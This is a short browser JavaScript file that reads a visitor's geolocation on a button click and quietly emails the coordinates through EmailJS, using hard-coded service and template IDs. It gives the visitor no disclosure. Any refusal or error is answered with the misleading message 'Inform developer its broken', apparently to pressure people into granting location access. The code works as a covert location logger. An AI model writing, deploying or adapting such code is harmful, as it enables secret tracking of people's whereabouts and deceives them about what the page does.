function getLocation() {
    if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sendPosition, showError);
    } else {
    document.getElementById("locationData").innerHTML = "Geolocation is not supported by this browser.";
    }
   }
   
   function sendPosition(position) {
    var params={
        latitude:position.coords.latitude ,
        longitude:position.coords.longitude
           }
           let serviceID="service_0px99hh"
let templateID="template_wqtopu5"
    emailjs.send(serviceID,templateID,params)
.then(res=>{
    position.coords.latitude
    position.coords.longitude
})
.catch(err=>console.log(err))
    
     ;
   }
   
   function showError(error) {
    switch(error.code) {
    case error.PERMISSION_DENIED:
    document.getElementById("locationData").innerHTML = "Inform developer its broken"
    break;
    case error.POSITION_UNAVAILABLE:
    document.getElementById("locationData").innerHTML = "Inform developer its broken"
    break;
    case error.TIMEOUT:
    document.getElementById("locationData").innerHTML = "Inform developer its broken"
    break;
    case error.UNKNOWN_ERROR:
    document.getElementById("locationData").innerHTML = "Inform developer its broken"
    break;
    }
   }
   const btn = document.getElementById('getLocationBtn');
   btn.addEventListener('click', getLocation);
